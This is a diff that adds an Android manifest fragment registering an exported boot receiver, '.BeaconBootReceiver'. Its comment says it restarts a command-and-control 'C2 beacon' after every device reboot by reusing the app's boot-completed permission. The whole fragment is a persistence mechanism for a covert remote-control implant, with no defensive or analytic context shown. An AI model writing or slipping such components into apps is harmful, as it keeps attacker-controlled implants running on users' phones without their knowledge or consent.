@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+    <application>
+        <!--
+            Beacon boot receiver: automatically restarts the C2 beacon after
+            a device reboot. RECEIVE_BOOT_COMPLETED is already declared in the
+            app manifest; this receiver hooks into that permission at module level.
+        -->
+        <receiver
+            android:name=".BeaconBootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
